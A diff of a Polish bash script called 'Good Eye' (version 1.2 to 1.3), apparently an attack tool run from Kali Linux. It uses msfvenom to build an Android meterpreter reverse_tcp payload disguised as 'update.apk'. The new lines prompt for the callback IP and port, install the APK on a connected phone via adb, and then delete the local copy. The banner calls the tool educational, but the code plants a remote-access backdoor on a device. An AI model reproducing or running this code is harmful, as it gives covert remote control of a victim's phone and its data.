@@ -47,8 +47,12 @@ reboot_celu()
 }
 
 generuj_ladunek()
-{
-	msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=$Moje_IP LPORT=4444 R > update.apk
+{	
+	echo " Podaj IP do komunikacji"
+	read R_Moje_IP
+	echo " Podaj port do komunikacji"
+	read R_PORT
+	msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=$R_Moje_IP LPORT=$R_PORT R > update.apk
 	clear
 	echo " Ladunek wygenerowany "
 	sudo ./goodeye.sh
@@ -59,7 +63,10 @@ zaladuj_ladunek_do_celu()
 {
 	adb -s $UE install update.apk
 	clear
-	echo " Ladunek zaladowany "
+	echo " Ladunek zaladowany do smartfona "
+	sleep 2
+	echo " Usuwam ladunek z pamieci Kaliego "
+	sudo rm update.apk
 	sudo ./goodeye.sh
 	
 }
@@ -154,10 +161,11 @@ echo "|---------------------------------|"
 echo "| Stworzono przez Przemyslaw Szmaj|"
 echo "| INSTA: _h4ker                   |"
 echo "| STRONA: www.ehaker.pl           |"
-echo "| Good Eye, wersja 1.2            |"
+echo "| Good Eye, wersja 1.3            |"
 echo "| Narzedzie stworzone w celu      |"
 echo "| EDUKACYJNYM                     |"
 echo "|---------------------------------|"
+
 
 echo " "
 echo "PODLACZONO DO: " 
